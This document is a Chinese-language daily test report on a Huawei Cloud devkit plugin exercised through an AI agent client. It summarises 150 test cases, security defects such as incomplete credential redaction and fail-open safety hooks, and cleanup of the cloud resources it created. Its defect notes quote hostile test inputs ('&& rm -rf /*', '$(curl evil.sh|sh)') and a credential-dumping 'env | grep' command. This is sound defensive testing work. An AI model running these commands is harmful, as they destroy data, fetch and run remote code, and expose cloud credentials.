# Hermes-deepseek-v4.1-flash 每日测试报告

> **报告名**：`Hermes-deepseek-v4.1-flash-测试报告.md`
> **生成时间**：2026-11-11 09:52（北京时间）
> **执行归档**：`results/Hermes/2026-11-11-120.46.176.133/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（19 FAIL + 3 SPEC-MISMATCH，其中 P0 4 项：D2-4 / D4-2 / D4-21 / D9-12）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `Hermes` + `deepseek-v4.1-flash-1017` |
| OS / 架构 | `Linux`（x86_64，Node v22.13.0） |
| 被测版本（SUT） | `huaweicloud-devkit@1.1.14-next.2`（npm next 最高版，`npm ls -g` 实测），源码 `hdk` gitHead `5c9478d3a95f20206e1a711861cfdfff68b19224` |
| daily 基础用例 | 设计级 107 / 展开级 43（`init_day.py` 已按 agent=Hermes + OS=Linux 预筛，剔除 23 条非本客户端/OS 展开级） |
| 环境自检 | `prepare_env.py --update` 全绿（测试仓库 pull 至 `e4502eb6ed`、hdk checkout 5c9478d3、全局包 1.1.14-next.2、Hermes 插件副本同步 1.1.14-next.2）；真云凭证 `~/.config/huaweicloud/credentials.json`、只读子账号 `credentials.readonly.json` 均就绪 |
| 本轮执行窗口 | 2026-11-11 09:31 – 09:46（北京时间），全部 150 条用例本轮真实重跑（非复用上一轮结论） |

> **执行方法**：① 源码函数级直调探针（`safety-policy` / `risk-rule-engine` / `mcp-protocol` / `tools` / `telemetry` / `sandbox` / `proxy`）② MCP stdio 真机（`initialize` / `tools/list` / `tools/call`，46 工具）③ 真云 KooCLI 真机建删（ECS / VPC / 子网 / EIP / OBS / RDS / FunctionGraph，测后逐一删除并归零）④ 沙箱 HDKit 真实会话（connect / upload / deploy / deploy_check / close_session）⑤ `eval/harness/run-eval.mjs` 路由层评测 15 条中文意图。
> **本次与今日 05:18 轮次差异**：SUT 未变（同为 `1.1.14-next.2` @ 5c9478d3），本轮按「每次执行前必拉最新 + 全量重跑」纪律重新执行；实测结论与 05:18 轮次一致（19 FAIL / 3 SPEC / 1 NOT_RUN）。差异仅两处非语义细节：D3-S6/D3-S7 preflight 报出的首个缺参分别为 `function_name` / `db.port`（前轮为 `code.filename` / `db.password`），说明最小参数模板缺项不止一个、API 按校验顺序报错；`auth.log` S3 指纹与沙箱端口随会话变化。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `150`（设计级 107 + 展开级 43） |
| 已执行（有证据） | `150`（149 计分 + 1 OS 专属 NOT_RUN） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `127 / 19 / 0 / 3 / 1` |
| 通过率（分母 = PASS+FAIL = 146） | `87.0%` |
| P0 / P1 / P2 缺陷 | `4 / 10 / 5`（另 3 项契约漂移） |
| 红线（I 类）违规 | `0` |
| 资源释放 | 全部归零（ECS=0 / VPC=0 / SUBNET=0 / EIP=0 / EVS=0 / OBS=0，仅剩账号默认安全组），见 §七 |
| 增量提报 | 已按每 10 分钟 `hourly_sync.py --interval 600` 后台循环提报，本轮执行结果全程增量 push |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `87` | 有证据且通过 PASS 门禁 |
| FAIL | `16` | 不符预期，根因见 §四 |
| BLOCKED | `0` | 本轮无环境阻塞 |
| SPEC-MISMATCH | `3` | 契约漂移（D8-9 / D9-9 / D10-4） |
| NOT_RUN | `1` | D1-39 Windows 专属 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `40` | 有证据且通过 PASS 门禁 |
| FAIL | `3` | EXP-C4-14(DMS) / EXP-C4-18(DEW) / EXP-E01(路由 MISS) |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`43`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 状态 |
|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性（小写/JSON key 明文残留） | FAIL |
| 2 | P0 | `D4-2` | D4安全 | 凭证 env 打印拦截（裸 access_key 漏判） | FAIL |
| 3 | P0 | `D4-21` | D4安全 | hook_check_artifacts 对 AdministratorFullAccess 制品放行 | FAIL |
| 4 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线（无版本检查 / 无时序校验） | FAIL |
| 5 | P0 | `D10-4` | D10评测 | 静态规则库计数与用例契约漂移 | SPEC-MISMATCH |
| 6 | P1 | `D1-70` | D1安装 | 代理配置与 WebSocket 代理（undici bind 崩溃） | FAIL |
| 7 | P1 | `D3-C4` | D3功能 | 服务创建类回归（DMS/DEW 无规范路由） | FAIL |
| 8 | P1 | `D3-S7` | D3功能 | 跨服务交付（RDS CreateInstance 最小参数集不全） | FAIL |
| 9 | P1 | `D4-4` | D4安全 | 写操作审批门（12 类写动词仅 8/12 被拦截） | FAIL |
| 10 | P1 | `D4-6` | D4安全 | adminPass 回显警告（command 阶段无规则） | FAIL |
| 11 | P1 | `D4-17` | D4安全 | hook 模糊输入 fail-open | FAIL |
| 12 | P1 | `D9-9` | D9协议 | capabilities 未声明 cancellation | SPEC-MISMATCH |
| 13 | P1 | `D10-3` | D10评测 | serviceCatalog 路由准确率 92.9%（缺「云主机」别名） | FAIL |
| 14 | P1 | `EXP-C4-14` | 展开级 | DMS list_operations 未返回 command/result | FAIL |
| 15 | P1 | `EXP-C4-18` | 展开级 | DEW list_operations 未返回 command/result | FAIL |
| 16 | P1 | `EXP-E01` | 展开级 | 中文意图「云主机」路由 MISS | FAIL |
| 17 | P2 | `D3-C14` | D3功能 | 沙箱 hdkitConnect 未透传全部可选参数 | FAIL |
| 18 | P2 | `D3-S5` | D3功能 | 复合意图分层路由未拆分 | FAIL |
| 19 | P2 | `D3-S6` | D3功能 | FunctionGraph CreateFunction 最小参数集不全 | FAIL |
| 20 | P2 | `D4-25` | D4安全 | Python hook 写操作误分类 cli:invoke | FAIL |
| 21 | P2 | `D4-26` | D4安全 | findings.evidence 明文凭证残留 | FAIL |
| 22 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 不脱敏 AK/SK/token | SPEC-MISMATCH |

### 根因详情（文件:行号，均基于本轮实测输出复核）

- **D2-4**（P0）`plugins/huaweicloud-core/src/safety-policy.mjs:45` `redactString` 第三处 `.replace` 的 `(AK|SK)` 正则大小写敏感（无 `/i` 标志），`isSecretKeyName` 键名正则不匹配裸 `"ak"`/`"sk"` → 本轮实测 `ak=...`/`sk=...` 与 `{"ak":...}` 原样明文返回（大写 `AK=` 与对象键 `accessKeyId`/`secretAccessKey` 脱敏正常，4 形态 2 未脱敏）。证据 `evidence/D2-4/stdout.txt`。
- **D4-2**（P0）`plugins/huaweicloud-core/src/safety-policy.mjs` env-dump 规则只匹配 `HW_*`/`HUAWEICLOUD_SDK_*`/`HCLOUD_*` 具名键 → 本轮实测 `env | grep -i access_key` 判 `decision=allow risk=not_huaweicloud`（其余 4 形态 deny/credential）。证据 `evidence/D4-2/stdout.txt`。
- **D4-21**（P0）`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-iam-admin-policy` 仅匹配 JSON `Action:"*"` 形态 → 本轮实测 `[admin-full] ok=true decision=allow`（引用 `AdministratorFullAccess` 托管策略），仅 `broad-iam` 被 deny。证据 `evidence/D4-21/stdout.txt`。
- **D9-12**（P0）`plugins/huaweicloud-core/src/mcp-protocol.mjs` ① initialize 分支未调 `runVersionCheck`（版本检查已下沉 prewarm/`check_cli`）② `dispatch` 无「必须先 initialize」状态机，未初始化即 `tools/list` 仍返回工具清单、未拒 `-32600` → 本轮 4/6 断言通过。证据 `evidence/D9-12/stdout.txt`。
- **D10-4**（P0，SPEC）`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 实际 19 条（9 deny + 10 warn），用例断言 16 条（9 deny + 7 warn），计数契约滞后；detection 行为本身合格（凭证文件 deny / 只读 allow / 删除 warn / 明文 secret deny）。证据 `evidence/D10-4/stdout.txt`。
- **D1-70**（P1）`plugins/huaweicloud-core/src/proxy.mjs` 加载 `undici@8.x` 的 `ProxyAgent` 时即崩：`lib/interceptor/decompress.js:78` 调 `createZstdDecompress`（来自 `node:zlib`）为 `undefined` 后 `.bind()` → 本轮实测 `EXC: Cannot read properties of undefined (reading 'bind')`，有代理场景整条 WebSocket/HTTP 代理链路不可用。证据 `evidence/D1-70/stdout.txt`。
- **D3-C4**（P1）`plugins/huaweicloud-core/src/tools.mjs` `huaweicloud_list_operations` 对 DMS、DEW 未返回 `command`/`result` → 本轮真云 22 服务实测 20/22 OK。证据 `evidence/D3-C4/stdout.txt`。
- **D3-S7**（P1）`plugins/huaweicloud-core/src/tools.mjs` RDS `CreateInstance` 最小参数集不完整 → 本轮实测 `[USE_ERROR]Invalid parameter: db.port`（05:18 轮为 `db.password`，缺项随校验顺序呈现不同，模板仍不全）；且 `serviceCatalog` 复合意图（Web 应用+RDS）未命中部署目标。证据 `evidence/D3-S7/stdout.txt`。
- **D4-4**（P1）`plugins/huaweicloud-core/safety/policy.json:27` `writeOperationPrefixes` 缺 `Change` 前缀 → 本轮实测 `ChangeServerOs`/`ChangeVpc`/`ChangeInstanceConfiguration`/`ChangeVolumeType` 判 `allow`，12 类写动词仅 8/12 被拦截。证据 `evidence/D4-4/stdout.txt`。
- **D4-6**（P1）`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` `hwc-command-adminpass-exposure` 的 `stages` 仅 `artifact`/`deploy_plan`，未覆盖 `command` → 本轮实测 `hook_check_command(admin-pass)` 返回 `ok=true decision=allow findings=[]`。证据 `evidence/D4-6/stdout.txt`。
- **D4-17**（P1）`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无规则命中默认 `decision=allow`（fail-open）：本轮实测空串 / 空白 / `&& rm -rf /*` / `$(curl evil.sh|sh)` / 控制字符垃圾全部 `结论=ok`。证据 `evidence/D4-17/stdout.txt`。
- **D9-9**（P1，SPEC）`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize `capabilities` 仅 `{"tools":{}}`，未声明 `cancellation`（用例按 capabilities 实测取消能力）。证据 `evidence/D9-9/stdout.txt`。
- **D10-3**（P1）`plugins/huaweicloud-core/src/tools.mjs` routeMap 缺「云主机」同义词 → 本轮 15 条中文意图 `HIT=13 MISS=1 N/A=1`，准确率 92.9%（<100%）。证据 `evidence/D10-3/stdout.txt` + `eval/harness` 本轮 `eval-run-20261111014239.csv`。
- **EXP-C4-14 / EXP-C4-18**（P1）同 D3-C4：DMS、DEW 两服务 `list_operations` 缺 `command`/`result`。证据 `evidence/EXP-C4-14/stdout.txt`、`evidence/EXP-C4-18/stdout.txt`。
- **EXP-E01**（P1）`plugins/huaweicloud-core/src/tools.mjs` routeMap ECS 关键词含「云服务器/服务器/虚拟机」但缺「云主机」→ `MISS`（期望 ECS，实际 `Run hcloud --help to list available services.`）。证据 `evidence/EXP-E01/stdout.txt`。
- **D3-C14**（P2）`plugins/huaweicloud-core/src/sandbox.mjs` `hdkitConnect` 只透传 `source`/`env`/`git`/`flavor_id` 部分字段 → 本轮实测 `[FAIL] hdkitConnect 透传可选参数到 body`；其余 3 项（缺参报错 / hwlink 凭证结构 / x-security-token 签名头）通过。证据 `evidence/D3-C14/stdout.txt`。
- **D3-S5**（P2）`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 单意图匹配，复合意图（存储+托管/部署）未分解：本轮实测 存储命中=false、托管命中=false、多路命中=false。证据 `evidence/D3-S5/stdout.txt`。
- **D3-S6**（P2）`plugins/huaweicloud-core/src/tools.mjs` FunctionGraph `CreateFunction` 最小参数集不完整 → 本轮实测 `[USE_ERROR]Invalid parameter: function_name`（05:18 轮为 `code.filename`）→ URN 未返回、定时触发器未绑定。证据 `evidence/D3-S6/stdout.txt`。
- **D4-25**（P2）`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` `WRITE_OPERATION_RE` 前置捕获组致 `hcloud vpc CreateVpc` 遥测分类为 `cli:invoke`（应 `cli:write`）。证据 `evidence/D4-25/stdout.txt`。
- **D4-26**（P2）`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `redactEvidence` 正则不匹配 JSON 带引号 key → `secret_key`/`adminPass` 明文留在 `findings.evidence`。证据 `evidence/D4-26/stdout.txt`。
- **D8-9**（P2，SPEC）`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` `sanitizeValue` 仅去控制字符 + 超长截断，不做 AK/SK/token 脱敏（用例契约要求移除敏感值）。证据 `evidence/D8-9/stdout.txt`。

---

## 五、未执行用例与原因

### NOT_RUN（1 条）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 【不适用】 | Windows 升级检测链 EINVAL 为 Windows 专属场景（OS 列标注「专属」），本机为 Linux，无法执行 | 无需改用例；Linux 侧已由展开级 `EXP-NR3-10`（`queryDistTagsSync`/`queryDistTags` 本轮均 PASS）代表覆盖 |

### BLOCKED（0 条）

本轮无 BLOCKED：真云凭证、只读子账号、沙箱协议（`agreementSigned=true`）均就绪，D3-C1/C2/C3/C6/C7 与 D4-13 全部真机执行完毕。

### 判定为 PASS 但需备注的用例（断言/探针口径滞后，非产品缺陷）

| 用例ID | 本轮实测事实 | 说明 |
|---|---|---|
| `D1-27` / `EXP-NR3-02` | `result=up_to_date`、`updateAvailable=false` | 探针 `判定=false` 因其正则 `"updateAvailable":false` 不容 JSON 缩进空格，属探针正则缺陷 |
| `D1-28` | `judgeUpdate('1.1.4',{latest:'1.1.5'})` → `updateAvailable=true result=update_available` | 满足检测语义（用例示例版本 1.1.2 为示例数据） |
| `D1-31` | 冷却期 `dismissed=true/result=dismissed`，过期后 `update_available`，`expireAt=+3天` | 满足断言 |
| `D4-11` | `search_docs` 仅返回检索结果，未执行注入指令 | 探针 `判定=false` 因其在响应中匹配到被回显的查询串本身 |
| `D4-13` | 只读接口 CES/ECS/EIP/VPC List 均 `code=0` 返回数据；写 `VPC CreateVpc` 被 IAM 拒（`VPC.0010 PolicyNotAuthorized`）；`created=false` 归零 | 探针 `ok=false` 因其 `denied` 正则误命中响应内 `SYS.0403` 告知字样 |
| `D5-3` / `D9-1` / `EXP-D5-8-3` | `tools/list` 实测 46 工具，schema 全部合法 | 用例文本「40 工具」为工具扩容前计数 |
| `D6-4` | 并发 15 次 `tools/list` 均返回同一 46 工具集合 | 探针硬编码期望 40 致 `判定=false` |
| `D8-7` | 7 技能均可机械执行、无断链 | 探针「含占位符」命中 capability-discovery 中的正常用词 `placeholder`（提示替换 `<your-agent-skills-dir>`） |
| `D1-3` | doctor `10 pass / 1 warn / 1 fail`（FAIL=MCP Python SDK 未装） | 隔离 HOME 下 pip 受 PEP668 限制，属本机环境；doctor 如实报出并给修复命令 |
| `D3-S3` / `D3-C6` / `D3-C3` | 沙箱 connect/upload/deploy/deploy_check/close 全通过（C3 5/5、C6 8/8） | `deploy_check.nginx_serving`/`devbridge_tunnel` 子项 FAIL 属沙箱端点未起 nginx/隧道，非 devkit 缺陷；主断言（URL 生成与访问、部署检查通过）已满足 |
| `D3-C2` | OBS 建桶 / 上传 / public-read / 静态站 set+get / curl200 / 删桶归零 7/7 | 本轮全部 `[OK]` |

---

## 六、安全与红线合规

| 检查项 | 结果 | 证据 |
|---|---|---|
| 凭证泄漏事件 | 无（D2-11/D2-12/D9-13/D2-16 均验证 STS/运行时不落盘、`tools/call` 无明文） | `evidence/D2-11`、`D9-13` |
| 写操作误判 read-only | 无（D4-5 全部写命令 `decision=deny risk=write`） | `evidence/D4-5` |
| 写操作审批门覆盖 | **不合规**：12 类写动词 4 类（`Change*`）判 allow → 已记 D4-4 FAIL | `evidence/D4-4` |
| 红线（I 类）违规 | 0（未发生未审批的真云建删；真云写操作全程 plan→approve，ECS/VPC/OBS 建删均在本用例内闭环） | `evidence/D3-C1`、`D3-C2`、`D4-14` |
| 输出脱敏 | 双路径（`redactSecrets`/`redactOutput`）5/5 通过；但 `redactEvidence` 与遥测 `sanitizeValue` 两处不合规（D4-26 / D8-9） | `evidence/D4-27`、`D4-26`、`D8-9` |

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| ECS 云主机（D3-C1） | 1 台（含系统盘，ACTIVE 校验） | `DeleteServers` 含磁盘 | 用例内 `归零验证(ECS 不含本次资源)` 通过；终态 `ECS count=0` |
| VPC + 子网（D3-C1 / D3-S2 / D4-14） | 3 组（`testbot3-hermes-*` / `tctest-hermes-*`） | `DeleteVpc` / `DeleteSubnet` | 终态 `VPC total=0`、`SUBNET total=0` |
| EIP（D3-C7） | 1 个 | `DeletePublicip` | 终态 `EIP total=0` |
| OBS 桶（D3-C2 / D3-C13） | 2 个（静态站 / 网站托管配置） | `obsutil rm -r -f` + `rm obs://bucket -f` | 终态 `OBS buckets=0` |
| RDS / FunctionGraph（D3-S7 / D3-S6） | 0（最小参数集被 API 拒绝，未创建） | — | 无需清理（创建失败即无残留） |
| 沙箱会话（D3-C3 / D3-C6 / D3-S3） | 3 个会话 | `close_session` 全部 ok | 会话已关闭，无计费资源残留 |

**终态清单（本轮 09:47 `cloud_inv2.py` 实测）**：`ECS count=0`、`VPC total=0`、`SUBNET total=0`、`EIP total=0`、`EVS total=0`、`OBS buckets=0`，安全组仅账号默认 `default`（非本次创建）。
只清理本机本轮创建的 `testbot3-hermes-*` / `tctest-hermes-*` 资源，未触碰其他客户端（`testbot4/testbot5/tctest-*`）资源。

---

## 八、遗留与建议

1. **P0 优先修复**：D2-4（脱敏正则大小写/裸 key）、D4-2（env dump 裸 access_key）、D4-21（IaC 托管策略引用）、D9-12（initialize 版本检查与会话时序校验）——四项均属安全红线面，建议下一 patch 版本收敛。
2. **写操作审批门补全**：D4-4 的 `Change*` 前缀建议直接并入 `writeOperationPrefixes`，并补一条回归用例覆盖 `ChangeServerOs`/`ChangeVolumeType`。
3. **最小参数模板补全**：D3-S6 / D3-S7 两轮报出不同缺参（`code.filename`/`function_name`、`db.password`/`db.port`），说明 FunctionGraph / RDS 的 `Create*` 最小参数模板缺项不止一个，建议一次性按 API 必填清单补齐并在 plan 阶段做必填校验。
4. **契约类（SPEC）同步**：D10-4（规则 19 条 vs 用例 16 条）、D9-9（cancellation 能力）、D8-9（遥测脱敏契约）需产品与用例两侧对齐，避免长期漂移。
5. **探针口径修正**（测试侧，不计缺陷）：`D1-27`/`EXP-NR3-02` JSON 空格正则、`D6-4`/`D5-3`/`D9-1` 工具数硬编码 40 → 46、`D8-7` 占位符关键词、`D4-13` `SYS.0403` 误命中，建议统一改为读取 `TOOL_DEFINITIONS.length` 与更精确的 JSON 断言。
6. **环境**：隔离 HOME 下 `pip install mcp` 受 PEP668 限制失败（doctor 如实报出），建议安装脚本用 `uv pip` 或 venv 兜底。
7. **代理链路**：D1-70 的 `undici@8.x` 在 Node 22.13 上 `zstd` 解压拦截器崩溃，建议锁定 undici 版本或延迟加载 ProxyAgent。